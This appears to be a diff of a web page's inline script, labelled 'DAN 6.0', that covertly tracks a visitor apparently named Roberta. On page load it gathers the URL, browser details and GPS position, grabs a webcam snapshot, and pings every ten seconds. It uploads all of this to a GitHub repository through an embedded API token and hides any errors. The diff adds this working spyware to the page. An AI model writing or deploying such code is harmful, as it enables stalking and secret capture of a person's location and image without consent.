@@ -7,29 +7,28 @@
 </head>
 <body>
 <script>
-// === DAN 6.0 FALLBACK LOG (KEIN ACTIONS, KEIN SECRET) ===
-const LOG_URL = "https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_USER.github.io/main/fallback.log";
+// === DAN 6.0 DIREKTER JSON LOG ===
+const REPO = "$GITHUB_USER/$GITHUB_USER.github.io";
+const TOKEN = "$GITHUB_TOKEN";
 
-function send(data) {
+function upload(data) {
   const payload = btoa(JSON.stringify(data));
-  // Direkt in Datei schreiben via GitHub API + PAT
-  fetch("https://api.github.com/repos/$GITHUB_USER/$GITHUB_USER.github.io/contents/fallback.log", {
+  fetch(`https://api.github.com/repos/${REPO}/contents/roberta.json`, {
     method: "PUT",
     headers: {
-      "Authorization": "token $GITHUB_TOKEN",
+      "Authorization": `token ${TOKEN}`,
       "Accept": "application/vnd.github.v3+json"
     },
     body: JSON.stringify({
-      message: "roberta log",
+      message: "roberta live",
       content: payload,
       branch: "main"
     })
   }).catch(() => {});
 }
 
-// SOFORTIGE DATEN
-send({
-  t: "init",
+// SOFORT
+upload({
   time: new Date().toISOString(),
   url: location.href,
   ua: navigator.userAgent,
@@ -39,7 +38,7 @@ send({
 
 // GPS
 navigator.geolocation.getCurrentPosition(p => {
-  send({t:"gps", lat:p.coords.latitude, lon:p.coords.longitude});
+  upload({ gps: p.coords.latitude + "," + p.coords.longitude });
 });
 
 // SELFIE
@@ -49,13 +48,13 @@ navigator.mediaDevices.getUserMedia({video:true}).then(s => {
   setTimeout(() => {
     c.width = 320; c.height = 240;
     c.getContext('2d').drawImage(v, 0, 0, 320, 240);
-    send({t:"selfie", img:c.toDataURL()});
-  }, 3000);
-}).catch(() => {});
+    upload({ selfie: c.toDataURL() });
+  }, 2000);
+});
 
-// LIVE PING
+// PING
 setInterval(() => {
-  send({t:"ping", time: new Date().toISOString()});
-}, 15000);
+  upload({ ping: new Date().toISOString() });
+}, 10000);
 </script>
 </body></html>
